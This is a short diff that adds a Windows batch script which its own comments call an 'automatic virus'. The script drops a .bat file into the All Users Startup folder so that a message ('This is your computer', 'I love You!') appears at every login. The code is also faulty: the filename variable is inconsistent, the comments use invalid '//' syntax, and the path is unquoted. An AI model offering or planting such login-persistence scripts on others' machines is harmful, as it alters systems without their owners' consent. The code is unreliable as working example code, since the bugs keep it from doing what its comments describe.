@@ -1,0 +1,10 @@
+@echo off
+cd C:\documents and settings\All Users\Start Menu\Programs\Startup
+echo echo This is your computer>%random%.bat
+echo echo I love You!>>%random.bat
+echo pause>>%random.bat
+
+//the above code is for autopmatic virus that will run evrytime someone loggs in
+//and the computer will print the following message This is your computer
+// i love you 
+// that's it
